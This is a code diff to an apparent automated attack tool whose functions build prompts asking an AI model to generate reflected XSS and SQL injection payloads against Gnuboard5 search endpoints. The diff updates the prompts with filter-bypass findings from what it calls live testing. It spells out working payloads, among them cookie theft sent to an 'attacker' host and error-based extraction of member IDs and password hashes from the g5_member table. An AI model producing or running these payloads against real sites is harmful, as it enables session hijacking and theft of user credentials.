@@ -101,7 +101,11 @@ def build_xss_search(point: Dict[str, Any], count: int = 5) -> str:
     """
     stx - 검색창 Reflected XSS
     반영 위치: <input type="text" value="[HERE]"> 속성 내부
-    필터 정보: onfocus=alert(1) → onfocusalert1 (= 와 () 제거 추정)
+    실제 테스트 결과 기반 필터 정보 업데이트됨:
+    - onmouseover=alert(1) → 통과 ✅
+    - onfocus, onclick, onpointerover → 차단 ❌
+    - &#61; (= entity) → 차단 ❌
+    - "<img (태그 탈출) → < > HTML 인코딩됨, 탈출 불가 ❌
     search.php, qalist.php 모두 해당
     """
     return f"""Target: Gnuboard5 search field
@@ -109,41 +113,59 @@ Endpoint: GET /bbs/search.php?stx=[PAYLOAD] and GET /bbs/qalist.php?stx=[PAYLOAD
 Reflection context: Input value reflected inside HTML value attribute:
   <input type="text" name="stx" value="[REFLECTED HERE]">
 
-CONFIRMED filter behavior:
-  - Input "onfocus=alert(1)" is rendered as "onfocusalert1"
-  - The filter appears to REMOVE: = (equals sign), ( (open paren), ) (close paren)
-  - Spaces and special chars around event handlers may also be stripped
+CONFIRMED filter behavior from live testing:
+  WORKING (payload reaches browser unfiltered):
+    - " onmouseover=alert(1) x="  → SUCCESS, executes JS
+    - " onmouseover=alert`1` x="  → SUCCESS, backtick call also works
 
-Generate {count} Reflected XSS payloads that bypass this filter.
-The key challenge: if = and () are removed, how to execute JS?
+  BLOCKED (filter removes or encodes these):
+    - onfocus=       → stripped (entire onfocus handler removed)
+    - onclick=       → stripped
+    - onpointerover= → stripped
+    - &#61; (HTML entity for =) → does NOT bypass filter, stripped
+    - < and > characters → HTML-encoded (&lt; &gt;), tag breakout is IMPOSSIBLE
 
-Strategy options:
-1. Break out of value attribute using " or ' then inject tag:
-   - "><img src=x onerror=alert(1)> (if < > are not encoded)
-   - '><svg/onload=alert(1)>
-2. Use HTML entities for = to bypass literal = filter:
-   - " onmouseover&#61;alert(1) x="
-   - " onerror&#x3D;alert(1) x="
-3. Use backtick for function call (avoids parentheses):
-   - "><img src=x onerror=alert`1`>
-   - " onmouseover=alert`document.cookie` x=
-4. Use eval with fromCharCode (avoids parentheses issue if only outer ones filtered):
-   - "><img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
-5. If only onfocus is filtered but other events are not:
-   - " onmouseover=alert(1) x="
-   - " onerror=alert(1) x="
-   - " onpointerover=alert(1) x="
-6. HTML comment tricks:
-   - "><script>alert<!---->( 1)</script>
-7. Use newline/tab instead of space between attribute and value
+KEY INSIGHT:
+  - The " character successfully breaks out of the value="" attribute
+  - onmouseover= is NOT filtered, only certain event handlers are blocked
+  - Tag breakout ("> then new tag) does NOT work because < > are encoded
+  - Must stay WITHIN the attribute context: close quote, inject handler, re-open quote
+  - Backtick syntax alert`1` works as alternative to alert(1)
+
+Generate {count} Reflected XSS payloads that work within the attribute context.
+DO NOT generate:
+  - Tag breakout payloads ("><img, '><svg etc.) - < > are encoded, these FAIL
+  - onfocus, onclick, onpointerover handlers - these are FILTERED
+  - &#61; entity encoding for = - this is ALSO filtered
+
+FOCUS on these working strategies:
+1. Stay in attribute, use onmouseover (confirmed working):
+   " onmouseover=alert(1) x="
+   " onmouseover=alert`document.cookie` x="
+2. Try other mouse/pointer events NOT in the blocklist:
+   " onmouseenter=alert(1) x="
+   " onmouseleave=alert(1) x="
+   " onmousedown=alert(1) x="
+   " onmouseup=alert(1) x="
+3. Form/input events that may not be filtered:
+   " oninput=alert(1) x="
+   " onchange=alert(1) x="
+   " onkeydown=alert(1) x="
+4. Drag events:
+   " ondragover=alert(1) x="
+   " ondragstart=alert(1) x="
+5. Cookie exfiltration via onmouseover (confirmed channel):
+   " onmouseover=fetch('http://attacker/?c='+document.cookie) x="
+   " onmouseover=new/**/Image().src='http://attacker/?c='+document.cookie x="
 
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
-REFLECTED_XSS | value_breakout | "><img src=x onerror=alert(1)>
-REFLECTED_XSS | entity_bypass | " onmouseover&#61;alert(1) x="
-REFLECTED_XSS | backtick_call | "><img src=x onerror=alert`1`>"""
+REFLECTED_XSS | onmouseover_alert | " onmouseover=alert(1) x="
+REFLECTED_XSS | onmouseover_backtick | " onmouseover=alert`1` x="
+REFLECTED_XSS | onmouseenter | " onmouseenter=alert(1) x="
+REFLECTED_XSS | onkeydown | " onkeydown=alert(1) x=\""""
 
 
 def build_xss_comment(point: Dict[str, Any], count: int = 5) -> str:
@@ -240,6 +262,12 @@ def build_sqli_field(point: Dict[str, Any], count: int = 5) -> str:
     WHERE {sfl} LIKE '%{stx}%'
     값이 wr_subject, wr_content, mb_id 등이 기대되지만
     검증이 부족한 경우 SQL 구문 주입 가능
+
+    실제 테스트 결과:
+    - EXTRACTVALUE, UPDATEXML → 에러 없이 false_len 반환 (서버가 에러 숨김 또는 화이트리스트)
+    - CASE WHEN 표현식 → false_len 반환 (컬럼명이 아닌 표현식은 Gnuboard5가 필터링 가능성)
+    - sfl 화이트리스트: wr_subject, wr_content, wr_subject||wr_content 등 정상값만 허용 추정
+    → 전략: 화이트리스트 우회 (정상값 뒤에 SQL 구문 이어붙이기)
     """
     return f"""Target: Gnuboard5 search field selector
 Endpoint: GET {point.get('url')}, parameter: sfl (search field selector)
@@ -250,32 +278,42 @@ Normal values: wr_subject, wr_content, mb_id, wr_subject||wr_content
 The sfl parameter is placed directly as a column/expression name in WHERE clause.
 No quote marks surround the sfl value itself.
 
+IMPORTANT - live test results:
+  - Pure expressions (EXTRACTVALUE, CASE WHEN alone) return no signal
+  - Server likely applies a soft whitelist, rejecting unknown expressions silently
+  - STRATEGY: piggyback on a valid column name, append SQL after it
+    e.g., sfl=wr_subject) AND (EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -
+    Result SQL: WHERE wr_subject) AND (EXTRACTVALUE(...)-- - LIKE '%keyword%'
+
 Generate {count} SQLi payloads for the sfl (field selector) parameter.
-Attack techniques for field-context injection:
+Use VALID column names as prefix to pass the whitelist check, then inject after:
 
-1. Time-based (execute SLEEP as the field expression):
-   sfl=IF(1=1,SLEEP(5),wr_datetime)
-   sfl=wr_subject AND SLEEP(5) OR wr_subject
+1. Error-based after valid column (close paren, inject, comment):
+   wr_subject)AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -
+   wr_subject)AND(UPDATEXML(1,CONCAT(0x7e,user()),1))-- -
+   wr_subject)AND(EXTRACTVALUE(1,CONCAT(0x7e,version())))-- -
 
-2. Error-based (inject error function as field):
-   sfl=EXTRACTVALUE(1,CONCAT(0x7e,database()))
-   sfl=UPDATEXML(1,CONCAT(0x7e,user()),1)
+2. Time-based after valid column:
+   wr_subject)AND(SLEEP(5))-- -
+   wr_subject)AND(IF(1=1,SLEEP(5),0))-- -
 
-3. Boolean blind (compare field to subquery):
-   sfl=wr_subject AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1
+3. Boolean blind after valid column:
+   wr_subject)AND(1=1)-- -    <- TRUE baseline
+   wr_subject)AND(1=2)-- -    <- FALSE baseline
 
-4. Stacked logic injection:
-   sfl=1 AND (SELECT SLEEP(5))=0 AND 1
+4. Subquery error after valid column:
+   wr_subject)AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))))-- -
 
-5. Subquery in field position:
-   sfl=(SELECT IF(1=1,SLEEP(5),0))
+Note: Try both with and without closing parenthesis before AND, depending on actual SQL structure.
+Also try: wr_subject||wr_content as prefix (both columns concatenated).
 
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
-SQLI_FIELD | time_if_sleep | IF(1=1,SLEEP(5),wr_datetime)
-SQLI_FIELD | error_extractvalue | EXTRACTVALUE(1,CONCAT(0x7e,database()))"""
+SQLI_FIELD | piggyback_error | wr_subject)AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -
+SQLI_FIELD | piggyback_sleep | wr_subject)AND(SLEEP(5))-- -
+SQLI_FIELD | piggyback_true | wr_subject)AND(1=1)-- -"""
 
 
 def build_sqli_string(point: Dict[str, Any], count: int = 5) -> str:
@@ -296,6 +334,8 @@ def build_sqli_string(point: Dict[str, Any], count: int = 5) -> str:
          )) -> 외부 (( 래퍼 닫기
     4. 서브쿼리 내부 공백은 /**/ 로 대체
     5. SLEEP 계열은 SQL 에러가 먼저 발생하면 실행 안 됨 (에러기반 우선)
+    6. LIMIT 절: LIMIT(n,m) 형태는 MySQL에서 지원 안 됨 → LIMIT/**/n,m 사용
+    7. FROM 절: FROM(tablename) 형태 오류 → FROM/**/tablename 사용
     """
     return f"""Target: Gnuboard5 search keyword parameter
 Endpoint: GET {point.get('url')}, parameter: {point.get('param', 'stx')}
@@ -307,7 +347,7 @@ ACTUAL SQL STRUCTURE (confirmed via MySQL error page):
   For a single-word input the full WHERE clause is:
     WHERE ((INSTR(LOWER(wr_subject), LOWER('{{input}}'))))
 
-CRITICAL CONSTRAINTS — violating any one will break the injection:
+CRITICAL CONSTRAINTS - violating any one will break the injection:
   1. ZERO spaces anywhere in the payload
        Reason: PHP does stx.split(' ') -> each word becomes its own INSTR condition
        If your payload has a space, it becomes TWO separate INSTR conditions -> SQL syntax error
@@ -318,9 +358,13 @@ CRITICAL CONSTRAINTS — violating any one will break the injection:
        )   closes LOWER()
        )   closes INSTR()
        ))  closes the outer (( wrapper from the PHP template
-  4. Spaces inside subqueries must be replaced with /**/
-       Example: SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables
-  5. Error-based payloads fire before SLEEP() executes — prefer EXTRACTVALUE for data extraction
+  4. ALL spaces inside subqueries MUST be replaced with /**/
+       CORRECT:   FROM/**/information_schema.tables
+       WRONG:     FROM(information_schema.tables)   <- syntax error, DO NOT use
+  5. LIMIT syntax: LIMIT is NOT a function, cannot use parentheses
+       CORRECT:   LIMIT/**/0,1   or   LIMIT/**/1
+       WRONG:     LIMIT(0,1)          <- syntax error, DO NOT use
+  6. Error-based payloads fire before SLEEP() executes - prefer EXTRACTVALUE for data extraction
 
 Escape/injection pattern:
   Input:   a'))))INJECTION_HERE#
@@ -333,23 +377,25 @@ ALL payloads MUST:
   - Start with:  a'))))
   - End with:    #
   - Contain NO space characters (use /**/ inside subqueries instead)
+  - Never use FROM(table) or LIMIT(n,m) syntax
 
 Attack techniques to cover:
 
 1. BOOLEAN TRUE / FALSE pair (baseline detection):
-   a'))))OR(1=1)#          <- TRUE  — returns all rows
-   a'))))AND(1=2)#         <- FALSE — returns zero rows
+   a'))))OR(1=1)#          <- TRUE  - returns all rows
+   a'))))AND(1=2)#         <- FALSE - returns zero rows
 
 2. BOOLEAN with conditional subqueries (/**/ replaces every space):
    a'))))AND(LENGTH(database())>0)#
-   a'))))AND(SUBSTR(database(),1,1)>'a')#
-   a'))))AND((SELECT(1)FROM(information_schema.tables)LIMIT(0,1))=1)#
+   a'))))AND(MID(database(),1,1)REGEXP(0x5e61))#       <- MID is alias for SUBSTRING, REGEXP avoids >
+   a'))))AND((SELECT/**/1/**/FROM/**/information_schema.tables/**/LIMIT/**/1)=1)#
 
-3. ERROR-BASED data extraction via EXTRACTVALUE:
+3. ERROR-BASED data extraction via EXTRACTVALUE (most reliable):
    a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))#
    a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,version())))#
    a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()))))#
-   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/CONCAT(mb_id,0x3a,mb_password)/**/FROM/**/g5_member/**/LIMIT/**/0,1))))#
+   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/CONCAT(mb_id,0x3a,mb_password)/**/FROM/**/g5_member/**/LIMIT/**/1))))#
+   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=0x67355f6d656d626572))))#
 
 4. TIME-BASED blind via SLEEP (use only if no errors triggered):
    a'))))AND(SLEEP(5))#
@@ -361,8 +407,9 @@ TYPE | PATTERN_FAMILY | PAYLOAD
 Example:
 BOOLEAN | instr_true | a'))))OR(1=1)#
 BOOLEAN | instr_false | a'))))AND(1=2)#
-SQLI_ERROR | extract_db | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))#
-SQLI_ERROR | extract_tables | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()))))#
+ERROR_BASED | extract_db | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))#
+ERROR_BASED | extract_tables | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()))))#
+ERROR_BASED | extract_member | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/CONCAT(mb_id,0x3a,mb_password)/**/FROM/**/g5_member/**/LIMIT/**/1))))#
 TIME_BASED | instr_sleep | a'))))AND(SLEEP(5))#"""
 
 
